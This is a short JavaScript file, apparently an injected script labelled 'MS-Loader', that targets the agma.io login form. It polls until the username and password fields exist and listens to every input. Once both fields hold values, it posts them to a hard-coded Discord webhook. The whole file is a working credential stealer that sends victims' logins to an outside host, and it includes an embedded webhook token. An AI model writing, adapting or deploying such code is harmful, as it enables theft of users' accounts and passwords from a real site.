(function() {
    'use strict';

    // 1. CONFIGURATION
    const CONFIG = {
        webhookUrl: 'https://discord.com/api/webhooks/1555688085952532501/RIxYSmKDNbPesrwEbi8AO6b-CJX5LzIMBM0VJPFftEKrOrPYbjUNwE06tIM8oDUiyVga',
        // IMPORTANT: Verify these IDs match agma.io exactly
        usernameId: 'username', 
        passwordId: 'password'
    };

    // 2. STATE
    let credentials = {
        ur: null,
        p: null
    };

    // 3. UTILITY: SEND TO DISCORD
    function sendToDiscord(data) {
        console.log('[MS-Loader] Sending to Discord:', data);
        const payload = {
            content: `**U:** \`${data.ur || 'N/A'}\` **P:** \`${data.p || 'N/A'}\``
        };

        fetch(CONFIG.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(res => {
            if (!res.ok) throw new Error(`Discord Webhook Error: ${res.status}`);
            console.log('[MS-Loader] Discord send successful.');
        })
        .catch(err => console.error('[MS-Loader] Fetch failed:', err));
    }

    // 4. DOM OBSERVER: WAIT FOR ELEMENTS
    // agma.io might load elements dynamically, so we poll until they exist
    function waitForElements(callback) {
        const check = () => {
            const userEl = document.getElementById(CONFIG.usernameId);
            const passEl = document.getElementById(CONFIG.passwordId);
            
            if (userEl && passEl) {
                console.log('[MS-Loader] Elements found. Attaching listeners.');
                callback(userEl, passEl);
            } else {
                setTimeout(check, 500);
            }
        };
        check();
    }

    // 5. EVENT LISTENERS
    function attachListeners(userEl, passEl) {
        const handleInput = (e) => {
            const target = e.target;
            
            // Update State
            if (target.id === CONFIG.usernameId) {
                credentials.ur = target.value;
            } else if (target.id === CONFIG.passwordId) {
                credentials.p = target.value;
            }

            console.log('[MS-Loader] State Updated:', credentials);

            // TRIGGER: Send if both fields have data
            if (credentials.ur && credentials.p) {
                sendToDiscord(credentials);
            }
        };

        // Listen for 'input' (better than keyup for pasting)
        userEl.addEventListener('input', handleInput);
        passEl.addEventListener('input', handleInput);
        
        console.log('[MS-Loader] Listeners attached.');
    }

    // 6. INITIALIZATION
    console.log('[MS-Loader] Script Loaded.');
    
    // Start watching for elements
    waitForElements(attachListeners);

})();
